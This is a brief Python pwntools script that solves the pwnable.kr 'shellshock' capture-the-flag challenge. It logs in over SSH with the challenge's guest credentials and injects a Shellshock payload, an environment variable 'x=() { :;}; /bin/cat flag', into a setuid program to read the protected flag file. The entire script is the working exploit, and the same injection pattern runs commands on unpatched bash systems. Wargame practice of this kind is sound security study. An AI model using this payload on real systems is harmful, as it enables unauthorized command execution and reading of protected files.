from pwn import *

session = ssh(host='pwnable.kr', user='shellshock', port=2222, password='guest')
io = session.run('/bin/sh', env={"PS1":""})

io.sendline("env x='() { :;}; /bin/cat flag' ./shellshock")
print(io.recvrepeat(1).decode())